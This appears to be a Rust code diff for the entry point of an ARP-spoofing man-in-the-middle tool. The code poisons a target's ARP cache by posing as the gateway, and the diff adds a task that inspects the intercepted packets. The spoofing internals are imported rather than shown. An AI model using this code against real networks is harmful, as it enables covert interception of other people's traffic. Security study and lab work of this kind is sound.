@@ -1,6 +1,8 @@
+use std::thread;
+
 use arp::spoofer::ArpSpoofer;
 use operating_system::network_tools::NetworkTools;
-use packet_inspection::inspector::Inspector;
+use packet_inspection::inspector::{Inspector, InspectorImpl};
 
 use crate::arp::spoofer::Mitm;
 
@@ -16,7 +18,7 @@ async fn main() {
     // We will spoof ARP packets saying we're the router to the client
     let tools = operating_system::network_tools::NetworkToolsImpl::new();
 
-    let interface = tools.fetch_interface("en0");
+    let interface = Box::from(tools.fetch_interface("en0"));
     let hw_addr = tools.fetch_hardware_address("en0").unwrap();
     let ipv4 = tools.fetch_ipv4_address("en0").unwrap();
 
@@ -28,11 +30,19 @@ async fn main() {
     let gateway = std::net::Ipv4Addr::from([***REMOVED***]);
     
     let mut sending_spoofer = arp::spoofer::ArpSpooferImpl::new(
-        interface,
+        interface.clone(),
         mitm,
         gateway
     );
 
     let target = std::net::Ipv4Addr::from([***REMOVED***]);
     sending_spoofer.spoof_target(target);
+
+    let mut monitor = InspectorImpl::new(interface.clone());
+
+    let handle = tokio::spawn(async move {
+        monitor.start_inspecting().await;
+    });
+
+    _ = tokio::join!(handle);
 }
